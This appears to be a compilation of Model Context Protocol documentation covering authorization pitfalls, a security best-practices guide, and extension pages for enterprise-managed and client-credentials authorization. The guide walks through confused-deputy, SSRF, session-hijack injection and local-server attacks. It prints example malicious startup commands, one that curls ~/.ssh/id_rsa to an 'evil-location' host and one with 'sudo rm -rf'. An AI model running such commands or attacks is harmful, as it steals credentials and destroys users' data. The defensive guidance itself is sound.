## Common Pitfalls and How to Avoid Them

For comprehensive security guidance, including attack vectors, mitigation strategies, and implementation best practices, make sure to read through [Security Best Practices](/specification/draft/basic/security_best_practices). A few key issues are called out below.

* **Do not implement token validation or authorization logic by yourself**. Use off-the-shelf, well-tested, and secure libraries for things like token validation or authorization decisions. Doing everything from scratch means that you're more likely to implement things incorrectly unless you are a security expert.
* **Use short-lived access tokens**. Depending on the authorization server used, this setting might be customizable. We recommend to not use long-lived tokens - if a malicious actor steals them, they will be able to maintain their access for longer periods.
* **Always validate tokens**. Just because your server received a token does not mean that the token is valid or that it's meant for your server. Always verify that what your MCP server is getting from the client matches the required constraints.
* **Store tokens in secure, encrypted storage**. In certain scenarios, you might need to cache tokens server-side. If that is the case, ensure that the storage has the right access controls and cannot be easily exfiltrated by malicious parties with access to your server. You should also implement robust cache eviction policies to ensure that your MCP server is not re-using expired or otherwise invalid tokens.
* **Enforce HTTPS in production**. Do not accept tokens or redirect callbacks over plain HTTP except for `localhost` during development.
* **Least-privilege scopes**. Don't use catch‑all scopes. Split access per tool or capability where possible and verify required scopes per route/tool on the resource server.
* **Don't log credentials**. Never log `Authorization` headers, tokens, codes, or secrets. Scrub query strings and headers. Redact sensitive fields in structured logs.
* **Separate app vs. resource server credentials**. Don't reuse your MCP server's client secret for end‑user flows. Store all secrets in a proper secret manager, not in source control.
* **Return proper challenges**. On 401, include `WWW-Authenticate` with `Bearer`, `realm`, and `resource_metadata` so clients can discover how to authenticate.
* **DCR (Dynamic Client Registration) controls**. If enabled, be aware of constraints specific to your organization, such as trusted hosts, required vetting, and audited registrations. Unauthenticated DCR means that anyone can register any client with your authorization server.
* **Multi‑tenant/realm mix-ups**. Pin to a single issuer/tenant unless explicitly multi‑tenant. Reject tokens from other realms even if signed by the same authorization server.
* **Audience/resource indicator misuse**. Don't configure or accept generic audiences (like `api`) or unrelated resources. Require the audience/resource to match your configured server.
* **Error detail leakage**. Return generic messages to clients, but log detailed reasons with correlation IDs internally to aid troubleshooting without exposing internals.
* **Session identifier hardening**. Treat `Mcp-Session-Id` as untrusted input; never tie authorization to it. Regenerate on auth changes and validate lifecycle server‑side.

## Related Standards and Documentation

MCP authorization builds on these well-established standards:

* **[OAuth 2.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13)**: The core authorization framework
* **[RFC 8414](https://datatracker.ietf.org/doc/html/rfc8414)**: Authorization Server Metadata discovery
* **[RFC 7591](https://datatracker.ietf.org/doc/html/rfc7591)**: Dynamic Client Registration
* **[RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728)**: Protected Resource Metadata
* **[RFC 8707](https://datatracker.ietf.org/doc/html/rfc8707)**: Resource Indicators

For additional details, refer to:

* [Authorization Specification](/specification/draft/basic/authorization)
* [Security Best Practices](/specification/draft/basic/security_best_practices)
* [Available MCP SDKs](/docs/sdk)

Understanding these standards will help you implement authorization correctly and troubleshoot issues when they arise.

# Security Best Practices
Source: https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices

Security considerations, attack vectors, and best practices for MCP implementations

## Introduction

### Purpose and Scope

This document provides security considerations for the Model Context
Protocol (MCP), complementing the
[MCP Authorization](/specification/latest/basic/authorization)
specification. This document identifies security risks, attack vectors,
and best practices specific to MCP implementations.

The primary audience for this document includes developers implementing
MCP authorization flows, MCP server operators, and security
professionals evaluating MCP-based systems. This document should be read
alongside the MCP Authorization specification and
[OAuth 2.0 security best practices](https://datatracker.ietf.org/doc/html/rfc9700).

## Attacks and Mitigations

This section gives a detailed description of attacks on MCP
implementations, along with potential countermeasures.

### Confused Deputy Problem

Attackers can exploit MCP proxy servers that connect to third-party
APIs, creating
"[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)"
vulnerabilities. This attack allows malicious clients to obtain
authorization codes without proper user consent by exploiting the
combination of static client IDs, dynamic client registration, and
consent cookies.

#### Terminology

**MCP Proxy Server**
: An MCP server that connects MCP clients to third-party APIs, offering
MCP features while delegating operations and acting as a single OAuth
client to the third-party API server.

**Third-Party Authorization Server**
: Authorization server that protects the third-party API. It may lack
dynamic client registration support, requiring the MCP proxy to use a
static client ID for all requests.

**Third-Party API**
: The protected resource server that provides the actual API
functionality. Access to this API requires tokens issued by the
third-party authorization server.

**Static Client ID**
: A fixed OAuth 2.0 client identifier used by the MCP proxy server when
communicating with the third-party authorization server. This Client ID
refers to the MCP server acting as a client to the Third-Party API. It
is the same value for all MCP server to Third-Party API interactions
regardless of which MCP client initiated the request.

#### Vulnerable Conditions

This attack becomes possible when all of the following conditions are
present:

* MCP proxy server uses a **static client ID** with a third-party
  authorization server
* MCP proxy server allows MCP clients to **dynamically register** (each
  getting their own client\_id)
* The third-party authorization server sets a **consent cookie** after
  the first authorization
* MCP proxy server does not implement proper per-client consent before
  forwarding to third-party authorization

#### Architecture and Attack Flows

##### Normal OAuth proxy usage (preserves user consent)

```mermaid 
sequenceDiagram
    participant UA as User-Agent (Browser)
    participant MC as MCP Client
    participant M as MCP Proxy Server
    participant TAS as Third-Party Authorization Server

    Note over UA,M: Initial Auth flow completed

    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server

    M->>UA: Redirect to third party authorization server
    UA->>TAS: Authorization request (client_id: mcp-proxy)
    TAS->>UA: Authorization consent screen
    Note over UA: Review consent screen
    UA->>TAS: Approve
    TAS->>UA: Set consent cookie for client ID: mcp-proxy
    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com
    UA->>M: 3P Authorization code
    Note over M,TAS: Exchange 3P code for 3P token
    Note over M: Generate MCP authorization code
    M->>UA: Redirect to MCP Client with MCP authorization code

    Note over M,UA: Exchange code for token, etc.
```

##### Malicious OAuth proxy usage (skips user consent)

```mermaid 
sequenceDiagram
    participant UA as User-Agent (Browser)
    participant M as MCP Proxy Server
    participant TAS as Third-Party Authorization Server
    participant A as Attacker

    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)
    A->>M: Dynamically register malicious client, redirect_uri: attacker.com
    A->>UA: Sends malicious link
    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie
    rect rgba(255, 17, 0, 0.67)
    TAS->>TAS: Cookie present, consent skipped
    end

   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com
   UA->>M: 3P Authorization code
   Note over M,TAS: Exchange 3P code for 3P token
   Note over M: Generate MCP authorization code
   M->>UA: Redirect to attacker.com with MCP Authorization code
   UA->>A: MCP Authorization code delivered to attacker.com
   Note over M,A: Attacker exchanges MCP code for MCP token
   A->>M: Attacker impersonates user to MCP server
```

#### Attack Description

When an MCP proxy server uses a static client ID to authenticate with
a third-party authorization server, the following attack becomes
possible:

1. A user authenticates normally through the MCP proxy server to access
   the third-party API
2. During this flow, the third-party authorization server sets a cookie
   on the user agent indicating consent for the static client ID
3. An attacker later sends the user a malicious link containing a
   crafted authorization request which contains a malicious redirect URI
   along with a new dynamically registered client ID
4. When the user clicks the link, their browser still has the consent
   cookie from the previous legitimate request
5. The third-party authorization server detects the cookie and skips the
   consent screen
6. The MCP authorization code is redirected to the attacker's server
   (specified in the malicious `redirect_uri` parameter during
   [dynamic client registration](/specification/latest/basic/authorization#dynamic-client-registration))
7. The attacker exchanges the stolen authorization code for access
   tokens for the MCP server without the user's explicit approval
8. The attacker now has access to the third-party API as the compromised
   user

#### Mitigation

To prevent confused deputy attacks, MCP proxy servers **MUST** implement
per-client consent and proper security controls as detailed below.

##### Consent Flow Implementation

The following diagram shows how to properly implement per-client consent
that runs **before** the third-party authorization flow:

```mermaid 
sequenceDiagram
    participant Client as MCP Client
    participant Browser as User's Browser
    participant MCP as MCP Server
    participant ThirdParty as Third-Party AuthZ Server

    Note over Client,ThirdParty: 1. Client Registration (Dynamic)
    Client->>MCP: Register with redirect_uri
    MCP-->>Client: client_id

    Note over Client,ThirdParty: 2. Authorization Request
    Client->>Browser: Open MCP server authorization URL
    Browser->>MCP: GET /authorize?client_id=...&redirect_uri=...

    alt Check MCP Server Consent
        MCP->>MCP: Check consent for this client_id
        Note over MCP: Not previously approved
    end

    MCP->>Browser: Show MCP server-owned consent page
    Note over Browser: "Allow [Client Name] to access [Third-Party API]?"
    Browser->>MCP: POST /consent (approve)
    MCP->>MCP: Store consent decision for client_id

    Note over Client,ThirdParty: 3. Forward to Third-Party
    MCP->>Browser: Redirect to third-party /authorize
    Note over MCP: Use static client_id for third-party

    Browser->>ThirdParty: Authorization request (static client_id)
    ThirdParty->>Browser: User authenticates & consents
    ThirdParty->>Browser: Redirect with auth code

    Browser->>MCP: Callback with third-party code
    MCP->>ThirdParty: Exchange code for token (using static client_id)
    MCP->>Browser: Redirect to client's registered redirect_uri
```

##### Required Protections

**Per-Client Consent Storage**

MCP proxy servers **MUST**:

* Maintain a registry of approved `client_id` values per user
* Check this registry **before** initiating the third-party
  authorization flow
* Store consent decisions securely (server-side database, or server
  specific cookies)

**Consent UI Requirements**

The MCP-level consent page **MUST**:

* Clearly identify the requesting MCP client by name
* Display the specific third-party API scopes being requested
* Show the registered `redirect_uri` where tokens will be sent
* Implement CSRF protection (e.g., state parameter, CSRF tokens)
* Prevent iframing via `frame-ancestors` CSP directive or
  `X-Frame-Options: DENY` to prevent clickjacking

**Consent Cookie Security**

If using cookies to track consent decisions, they **MUST**:

* Use `__Host-` prefix for cookie names
* Set `Secure`, `HttpOnly`, and `SameSite=Lax` attributes
* Be cryptographically signed or use server-side sessions
* Bind to the specific `client_id` (not just "user has consented")

**Redirect URI Validation**

The MCP proxy server **MUST**:

* Validate that the `redirect_uri` in authorization requests exactly
  matches the registered URI
* Reject requests if the `redirect_uri` has changed without
  re-registration
* Use exact string matching (not pattern matching or wildcards)

**OAuth State Parameter Validation**

The OAuth `state` parameter is critical to prevent authorization code
interception and CSRF attacks. Proper state validation ensures that
consent approval at the authorization endpoint is enforced at the
callback endpoint.

MCP proxy servers implementing OAuth flows **MUST**:

* Generate a cryptographically secure random `state` value for each
  authorization request
* Store the `state` value server-side (in a secure session store or
  encrypted cookie) **only after** consent has been explicitly approved
* Set the `state` tracking cookie/session **immediately before**
  redirecting to the third-party identity provider (not before consent
  approval)
* Validate at the callback endpoint that the `state` query parameter
  exactly matches the stored value in the callback request's cookies or
  in the request's cookie-based session
* Reject any callback requests where the `state` parameter is missing
  or does not match
* Ensure `state` values are single-use (delete after validation) and
  have a short expiration time (e.g., 10 minutes)

The consent cookie or session containing the `state` value **MUST NOT**
be set until **after** the user has approved the consent screen at the
MCP server's authorization endpoint. Setting this cookie before consent
approval renders the consent screen ineffective, as an attacker could
bypass it by crafting a malicious authorization request.

### Token Passthrough

"Token passthrough" is an anti-pattern where an MCP server accepts
tokens from an MCP client without validating that the tokens were
properly issued *to the MCP server* and passes them through to the
downstream API.

#### Risks

Token passthrough is explicitly forbidden in the
[authorization specification](/specification/latest/basic/authorization)
as it introduces a number of security risks, that include:

* **Security Control Circumvention**
  * The MCP Server or downstream APIs might implement important security
    controls like rate limiting, request validation, or traffic
    monitoring, that depend on the token audience or other credential
    constraints. If clients can obtain and use tokens directly with the
    downstream APIs without the MCP server validating them properly or
    ensuring that the tokens are issued for the right service, they
    bypass these controls.
* **Accountability and Audit Trail Issues**
  * The MCP Server will be unable to identify or distinguish between MCP
    Clients when clients are calling with an upstream-issued access token
    which may be opaque to the MCP Server.
  * The downstream Resource Server's logs may show requests that appear
    to come from a different source with a different identity, rather
    than the MCP server that is actually forwarding the tokens.
  * Both factors make incident investigation, controls, and auditing
    more difficult.
  * If the MCP Server passes tokens without validating their claims
    (e.g., roles, privileges, or audience) or other metadata, a
    malicious actor in possession of a stolen token can use the server
    as a proxy for data exfiltration.
* **Trust Boundary Issues**
  * The downstream Resource Server grants trust to specific entities.
    This trust might include assumptions about origin or client behavior
    patterns. Breaking this trust boundary could lead to unexpected
    issues.
  * If the token is accepted by multiple services without proper
    validation, an attacker compromising one service can use the token
    to access other connected services.
* **Future Compatibility Risk**
  * Even if an MCP Server starts as a "pure proxy" today, it might need
    to add security controls later. Starting with proper token audience
    separation makes it easier to evolve the security model.

#### Mitigation

MCP servers **MUST NOT** accept any tokens that were not explicitly
issued for the MCP server.

### Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is an attack where an attacker can
induce an MCP client to make HTTP requests to unintended destinations,
potentially accessing internal network resources, cloud metadata
endpoints, or other protected services.

#### Attack Description

During OAuth metadata discovery, MCP clients fetch URLs from several
sources that could be controlled by a malicious MCP server:

1. The `resource_metadata` URL from the `WWW-Authenticate` header
2. The `authorization_servers` URLs from the Protected Resource Metadata
   document
3. The `token_endpoint`, `authorization_endpoint`, and other URLs from
   Authorization Server Metadata

A malicious MCP server can populate these fields with URLs pointing to
internal resources, enabling the following attack patterns:

* **Direct internal IP access**: URLs like `http://192.168.1.1/admin` or
  `http://10.0.0.1/api` target internal network services
* **Cloud metadata endpoints**: URLs targeting
  `http://169.254.169.254/` (AWS/GCP/Azure metadata service) can
  exfiltrate cloud credentials and instance information
* **Localhost services**: URLs like `http://localhost:6379/` can interact
  with local services (Redis, databases, admin panels)
* **DNS rebinding**: Domains that change DNS resolution between
  validation and use (e.g., `https://attacker.com` resolving to a safe
  IP initially, then to `192.168.1.1`)
* **Redirect chains**: Normal-looking URLs that redirect to internal
  resources

```mermaid 
sequenceDiagram
    participant Client as MCP Client
    participant MCP as Malicious MCP Server
    participant Internal as Internal Service

    Client->>MCP: Connect to MCP server
    MCP-->>Client: 401 + resource_metadata="http://169.254.169.254/..."

    Note over Client: Client follows URL without validation
    Client->>Internal: GET http://169.254.169.254/latest/meta-data/
    Internal-->>Client: Cloud credentials/metadata

    Note over Client: Error or response details leak to attacker
    Client->>MCP: Subsequent request with error details
```

#### Risks

* **Credential exfiltration**: Cloud metadata endpoints often expose
  IAM credentials, API keys, and other secrets
* **Internal network reconnaissance**: Error messages reveal information
  about internal network topology and services
* **Service interaction**: POST requests (e.g., to token endpoints) can
  trigger mutations on internal services
* **Firewall bypass**: The MCP client acts as a proxy, bypassing network
  perimeter controls
* **Data exfiltration**: Internal service responses may be reflected back
  to attackers through error messages or OAuth flows

#### Mitigation

MCP clients deployed to a server **MUST** consider SSRF risks and
implement appropriate mitigations when fetching OAuth-related URLs.
Which protections are appropriate depend on your network environment.

**Enforce HTTPS**

MCP clients **SHOULD** require HTTPS for all OAuth-related URLs in
production environments:

* Reject `http://` URLs except for loopback addresses (`localhost`,
  `127.0.0.1`, `::1`) during development
* This aligns with
  [OAuth 2.1 Section 1.5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5)
  which requires HTTPS for all OAuth protocol URLs except loopback
  redirect URIs
* Provide an explicit opt-out mechanism for development/testing
  scenarios

**Block Private IP Ranges**

MCP clients **SHOULD** block requests to private and reserved IP address
ranges as recommended by
[RFC 9728 Section 7.7](https://datatracker.ietf.org/doc/html/rfc9728#section-7.7):

* Private IPv4 ranges: `10.0.0.0/8`, `172.16.0.0/12`,
  `192.168.0.0/16`
* Loopback: `127.0.0.0/8`, `::1` (except when explicitly allowed for
  development)
* Link-local: `169.254.0.0/16` (including cloud metadata endpoints)
* Private IPv6 ranges: `fc00::/7`, `fe80::/10`

  Avoid implementing IP validation manually. Attackers exploit encoding tricks
  (octal, hex, IPv4-mapped IPv6) that custom parsers often miss.

**Validate Redirect Targets**

MCP clients **SHOULD** apply the same URL validation to redirect
targets:

* Do not blindly follow redirects to internal resources
* Apply HTTPS and IP range restrictions to redirect destinations
* Consider disabling automatic redirect following and validating each
  hop

**Use Egress Proxies**

For server-side MCP client deployments, operators **SHOULD** consider
using an egress proxy that enforces network policies:

* Route OAuth discovery requests through a proxy that blocks internal
  destinations
* Use tools like
  [Smokescreen](https://github.com/stripe/smokescreen) or similar
  egress proxies that prevent SSRF by design
* Configure network policies to restrict the MCP client's outbound
  access

**DNS Resolution Considerations**

Be aware of Time-of-Check to Time-of-Use (TOCTOU) issues with
DNS-based validation:

* An attacker's domain may resolve to a safe IP during validation but
  to an internal IP during the actual request
* Consider pinning DNS resolution results between check and use
* Defense in depth: combine DNS checks with other mitigations

#### Resources and Tools

The following resources can help developers implement SSRF protections
in MCP clients.

**Reference Documentation**

* [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html):
  Comprehensive guidance on SSRF prevention techniques, including input
  validation, allowlist strategies, and network-level controls
* [OWASP Top 10 A10:2021 - SSRF](https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/):
  SSRF in the context of the most critical web application security
  risks

### Session Hijacking

Session hijacking is an attack vector where a client is provided a
session ID by the server, and an unauthorized party is able to obtain
and use that same session ID to impersonate the original client and
perform unauthorized actions on their behalf.

#### Session Hijack Prompt Injection

```mermaid 
sequenceDiagram
    participant Client
    participant ServerA
    participant Queue
    participant ServerB
    participant Attacker

    Client->>ServerA: Initialize (connect to streamable HTTP server)
    ServerA-->>Client: Respond with session ID

    Attacker->>ServerB: Access/guess session ID
    Note right of Attacker: Attacker knows/guesses session ID

    Attacker->>ServerB: Trigger event (malicious payload, using session ID)
    ServerB->>Queue: Enqueue event (keyed by session ID)

    ServerA->>Queue: Poll for events (using session ID)
    Queue-->>ServerA: Event data (malicious payload)

    ServerA-->>Client: Async response (malicious payload)
    Client->>Client: Acts based on malicious payload
```

#### Session Hijack Impersonation

```mermaid 
sequenceDiagram
    participant Client
    participant Server
    participant Attacker

    Client->>Server: Initialize (login/authenticate)
    Server-->>Client: Respond with session ID (persistent session created)

    Attacker->>Server: Access/guess session ID
    Note right of Attacker: Attacker knows/guesses session ID

    Attacker->>Server: Make API call (using session ID, no re-auth)
    Server-->>Attacker: Respond as if Attacker is Client (session hijack)
```

#### Attack Description

When you have multiple stateful HTTP servers that handle MCP requests,
the following attack vectors are possible:

**Session Hijack Prompt Injection**

1. The client connects to **Server A** and receives a session ID.

2. The attacker obtains an existing session ID and sends a malicious
   event to **Server B** with said session ID.
   * When a server supports
     [redelivery/resumable streams](/specification/latest/basic/transports#resumability-and-redelivery),
     deliberately terminating the request before receiving the response
     could lead to it being resumed by the original client via the GET
     request for server sent events.
   * If a particular server initiates server sent events as a
     consequence of a tool call such as a
     `notifications/tools/list_changed`, where it is possible to affect
     the tools that are offered by the server, a client could end up
     with tools that they were not aware were enabled.

3. **Server B** enqueues the event (associated with session ID) into a
   shared queue.

4. **Server A** polls the queue for events using the session ID and
   retrieves the malicious payload.

5. **Server A** sends the malicious payload to the client as an
   asynchronous or resumed response.

6. The client receives and acts on the malicious payload, leading to
   potential compromise.

**Session Hijack Impersonation**

1. The MCP client authenticates with the MCP server, creating a
   persistent session ID.
2. The attacker obtains the session ID.
3. The attacker makes calls to the MCP server using the session ID.
4. MCP server does not check for additional authorization and treats the
   attacker as a legitimate user, allowing unauthorized access or
   actions.

#### Mitigation

To prevent session hijacking and event injection attacks, the following
mitigations should be implemented:

MCP servers that implement authorization **MUST** verify all inbound
requests. MCP Servers **MUST NOT** use sessions for authentication.

MCP servers **MUST** use secure, non-deterministic session IDs.
Generated session IDs (e.g., UUIDs) **SHOULD** use secure random number
generators. Avoid predictable or sequential session identifiers that
could be guessed by an attacker. Rotating or expiring session IDs can
also reduce the risk.

MCP servers **SHOULD** bind session IDs to user-specific information.
When storing or transmitting session-related data (e.g., in a queue),
combine the session ID with information unique to the authorized user,
such as their internal user ID. Use a key format like
`<user_id>:<session_id>`. This ensures that even if an attacker guesses
a session ID, they cannot impersonate another user as the user ID is
derived from the user token and not provided by the client.

MCP servers can optionally leverage additional unique identifiers.

### Local MCP Server Compromise

Local MCP servers are MCP Servers running on a user's local machine,
either by the user downloading and executing a server, authoring a
server themselves, or installing through a client's configuration flows.
These servers may have direct access to the user's system and may be
accessible to other processes running on the user's machine, making them
attractive targets for attacks.

#### Attack Description

Local MCP servers are binaries that are downloaded and executed on the
same machine as the MCP client. Without proper sandboxing and consent
requirements in place, the following attacks become possible:

1. An attacker includes a malicious "startup" command in a client
   configuration
2. An attacker distributes a malicious payload inside the server itself
3. An attacker accesses an insecure local server that's left running on
   localhost via DNS rebinding

Example malicious startup commands that could be embedded:

```bash 
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location

# Privilege escalation
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

#### Risks

Local MCP servers with inadequate restrictions or from untrusted sources
introduce several critical security risks:

* **Arbitrary code execution**. Attackers can execute any command with
  MCP client privileges.
* **No visibility**. Users have no insight into what commands are being
  executed.
* **Command obfuscation**. Malicious actors can use complex or
  convoluted commands to appear legitimate.
* **Data exfiltration**. Attackers can access legitimate local MCP
  servers via compromised JavaScript.
* **Data loss**. Attackers or bugs in legitimate servers could lead to
  irrecoverable data loss on the host machine.

#### Mitigation

If an MCP client supports one-click local MCP server configuration, it
**MUST** implement proper consent mechanisms prior to executing commands.

**Pre-Configuration Consent**

Display a clear consent dialog before connecting a new local MCP server
via one-click configuration. The MCP client **MUST**:

* Show the exact command that will be executed, without truncation
  (include arguments and parameters)
* Clearly identify it as a potentially dangerous operation that executes
  code on the user's system
* Require explicit user approval before proceeding
* Allow users to cancel the configuration

The MCP client **SHOULD** implement additional checks and guardrails to
mitigate potential code execution attack vectors:

* Highlight potentially dangerous command patterns (e.g., commands
  containing `sudo`, `rm -rf`, network operations, file system access
  outside expected directories)
* Display warnings for commands that access sensitive locations (home
  directory, SSH keys, system directories)
* Warn that MCP servers run with the same privileges as the client
* Execute MCP server commands in a sandboxed environment with minimal
  default privileges
* Launch MCP servers with restricted access to the file system, network,
  and other system resources
* Provide mechanisms for users to explicitly grant additional privileges
  (e.g., specific directory access, network access) when needed
* Use platform-appropriate sandboxing technologies (containers, chroot,
  application sandboxes, etc.)
* Keep sandboxing solutions up-to-date to account for emerging
  vulnerabilities

MCP servers intending for their servers to be run locally **SHOULD**
implement measures to prevent unauthorized usage from malicious
processes:

* Use the `stdio` transport to limit access to just the MCP client
* Restrict access if using an HTTP transport, such as:
  * Require an authorization token
  * Use unix domain sockets or other Interprocess Communication (IPC)
    mechanisms with restricted access

### Scope Minimization

Poor scope design increases token compromise impact, elevates user
friction, and obscures audit trails.

#### Attack Description

An attacker obtains (via log leakage, memory scraping, or local
interception) an access token carrying broad scopes (`files:*`, `db:*`,
`admin:*`) that were granted up front because the MCP server exposed
every scope in `scopes_supported` and the client requested them all.
The token enables lateral data access, privilege chaining, and difficult
revocation without re-consenting the entire surface.

#### Risks

* Expanded blast radius: stolen broad token enables unrelated
  tool/resource access
* Higher friction on revocation: revoking a max-privilege token disrupts
  all workflows
* Audit noise: single omnibus scope masks user intent per operation
* Privilege chaining: attacker can immediately invoke high-risk tools
  without further elevation prompts
* Consent abandonment: users decline dialogs listing excessive scopes
* Scope inflation blindness: lack of metrics makes over-broad requests
  normalised

#### Mitigation

Implement a progressive, least-privilege scope model:

* Minimal initial scope set (e.g., `mcp:tools-basic`) containing only
  low-risk discovery/read operations
* Incremental elevation via targeted `WWW-Authenticate` `scope="..."`
  challenges when privileged operations are first attempted
* Down-scoping tolerance: server should accept reduced scope tokens;
  auth server MAY issue a subset of requested scopes

Server guidance:

* Emit precise scope challenges; avoid returning the full catalog
* Log elevation events (scope requested, granted subset) with
  correlation IDs

Client guidance:

* Begin with only baseline scopes (or those specified by initial
  `WWW-Authenticate`)
* Cache recent failures to avoid repeated elevation loops for denied
  scopes

#### Common Mistakes

* Publishing all possible scopes in `scopes_supported`
* Using wildcard or omnibus scopes (`*`, `all`, `full-access`)
* Bundling unrelated privileges to preempt future prompts
* Returning entire scope catalog in every challenge
* Silent scope semantic changes without versioning
* Treating claimed scopes in token as sufficient without server-side
  authorization logic

Proper minimization constrains compromise impact, improves audit
clarity, and reduces consent churn.

# Enterprise-Managed Authorization
Source: https://modelcontextprotocol.io/extensions/auth/enterprise-managed-authorization

Centralized access control for MCP in enterprise environments via identity providers

The Enterprise-Managed Authorization extension (`io.modelcontextprotocol/enterprise-managed-authorization`) enables organizations to control MCP server access centrally through their existing identity provider (IdP). Instead of each employee authorizing each MCP server individually, the organization's IT or security team manages access policies in one place.

  Full technical specification for the Enterprise-Managed Authorization
  extension.

## What it is

In a standard MCP deployment, each user independently authorizes an MCP client to access each MCP server. For consumer applications, this user-driven model is ideal — it gives individuals control over what accesses their data.

In enterprise environments, this model creates friction and security gaps:

* Employees shouldn't need to understand the authorization details of every MCP server their organization uses
* Security teams can't enforce consistent access policies if each user authorizes independently
* Onboarding new employees requires them to manually authorize dozens of services
* Offboarding requires revoking access across every service individually

Enterprise-Managed Authorization solves this by introducing the organization's IdP as the authoritative decision-maker. The IdP (such as Okta, Azure AD, or a corporate SSO system) controls which MCP servers employees can access, and under what conditions. Employees authenticate with their corporate identity — the same credentials they use for email, Slack, and other work tools — and the IdP grants or denies MCP server access based on organizational policy.

## When to use it

Use Enterprise-Managed Authorization when:

* **Deploying MCP in a corporate environment** where IT manages access to all business applications
* **Enforcing organizational access policies** — you need to ensure only authorized employees access specific MCP servers
* **Centralizing access control** — you want to add or revoke access to MCP servers from a single admin console
* **Meeting compliance requirements** — your organization needs an auditable authorization trail for all MCP server access
* **Simplifying employee experience** — employees should access MCP tools with their existing corporate SSO credentials, without per-service authorization flows

## How it works

The extension establishes a delegated authorization flow where the enterprise IdP acts as an intermediary between the MCP client and the MCP server. The MCP Client requests a special type of token from the enterprise IdP called an Identity Assertion JWT Authorization Grant, or ID-JAG. The MCP Client then exchanges the ID-JAG for an access token from the MCP server's Authorization Server:

```mermaid 
sequenceDiagram
    participant UA as Browser
    participant C as MCP Client
    participant IdP as Enterprise IdP
    participant MAS as MCP Authorization Server
    participant MRS as MCP Resource Server

    C-->>UA: Redirect to IdP
    UA->>IdP: Redirect to IdP
    Note over IdP: User Logs In
    IdP-->>UA: IdP Authorization Code
    UA->>C: IdP Authorization Code
    C->>IdP: Token Request with IdP Authorization Code
    IdP-->>C: ID Token

    note over C: User is logged<br/>in to MCP Client.<br/>Client stores ID Token.

    C->>IdP: Exchange ID Token for ID-JAG
    note over IdP: Evaluate Policy
    IdP-->>C: Responds with ID-JAG
    C->>MAS: Token Request with ID-JAG
    note over MAS: Validate ID-JAG
    MAS-->>C: MCP Access Token

    loop
    C->>MRS: Call MCP API with Access Token
    MRS-->>C: MCP Response with Data
    end

```

Key aspects of the flow:

1. **Centralized policy**: The enterprise IdP maintains a registry of approved MCP servers and the access policies for each. Administrators configure these in their existing identity management tools.

2. **Single sign-on**: Employees authenticate with their corporate credentials once. The IdP issues tokens that grant access to approved MCP servers without additional per-server authorization prompts.

3. **Policy enforcement**: The IdP evaluates access policies (group membership, role assignments, conditional access rules) before issuing tokens. Employees who lack authorization receive an appropriate error — the MCP client never receives a token for unauthorized servers.

4. **Centralized revocation**: Revoking an employee's access to MCP servers happens at the IdP level, taking effect immediately across all MCP clients. No per-client, per-server revocation needed.

## Implementation guide

### For MCP clients

To support Enterprise-Managed Authorization, your client must:

1. **Declare support** in the `initialize` request:

```json 
{
  "capabilities": {
    "extensions": {
      "io.modelcontextprotocol/enterprise-managed-authorization": {}
    }
  }
}
```

2. **Support SSO** — users should authenticate to the MCP Client using the enterprise IdP. Save the Identity Assertion (either an OpenID ID Token or SAML assertion) issued during login for later use.

3. **Handle ID-JAGs** — when the server indicates that enterprise-managed auth is required, request an ID-JAG token from the enterprise IdP's authorization endpoint using the previously obtained Identity Assertion. Exchange this ID-JAG for an access token from the MCP Authorization Server. Do not redirect the user to the MCP Authorization Server's authorization endpoint.

4. **Support organization configuration** — allow administrators to configure the enterprise IdP's endpoints, typically via organization-level settings rather than per-user settings.

5. **Respect token scopes** — tokens issued by enterprise IdPs may have scope restrictions that differ from standard MCP authorization. Handle scope errors gracefully.

### For MCP servers

To require enterprise-managed authorization:

1. **Declare the extension** in your server's authorization metadata, indicating that clients must use the enterprise-managed flow.

2. **Integrate with IdP admin APIs** (optional) — publish your server's resource descriptor so enterprise administrators can configure access policies in their IdP admin console.

### For MCP Authorization Servers

1. **Validate ID-JAGs** issued by the enterprise IdP. This typically means validating JWT signatures against the IdP's JWKS endpoint and checking the token's audience, issuer, and expiration.

2. **Map IdP claims to permissions** — ID-JAG tokens carry claims (scope and resource information) that your server uses to determine who the employee is and what the employee can access. Define your authorization logic based on these claims.

3. **Handle Account Linking** - ID-JAG tokens will always contain a subject claim and may additionally contain an email claim that can be used to

## Client support

  Support for this extension varies by client. Extensions are opt-in and never active by default.

Check the [client matrix](/extensions/client-matrix) for current implementation status across MCP clients. Enterprise-Managed Authorization typically requires client-level support from the organization's IT team in addition to the MCP client application.

## Related resources

  
    Source code and reference implementations
  

  
    Technical specification with normative requirements
  

  
    Original proposal: Enable Enterprise IdP Policy Controls
  

  
    Core MCP authorization specification
  

# OAuth Client Credentials
Source: https://modelcontextprotocol.io/extensions/auth/oauth-client-credentials

Machine-to-machine authentication for MCP using the OAuth 2.0 client credentials flow

The OAuth Client Credentials extension (`io.modelcontextprotocol/oauth-client-credentials`) adds support for the [OAuth 2.0 client credentials flow](https://datatracker.ietf.org/doc/html/rfc6749#section-4.4) to MCP. This enables automated systems to connect to MCP servers without interactive user authorization.

  Full technical specification for the OAuth Client Credentials extension.

## What it is

The standard MCP authorization flow requires a user to interactively approve access — a browser opens, the user logs in, and grants permission. That works well for humans, but breaks down when there's no user present.

The OAuth Client Credentials extension solves this by letting a client authenticate using application-level credentials (a client ID and secret, or a signed JWT assertion) rather than delegated user credentials. The client proves its identity directly to the authorization server, which issues an access token without requiring a browser redirect or user interaction.

## When to use it

Use OAuth Client Credentials when:

* **Background services** need to call MCP tools on a schedule or in response to events, without a user present
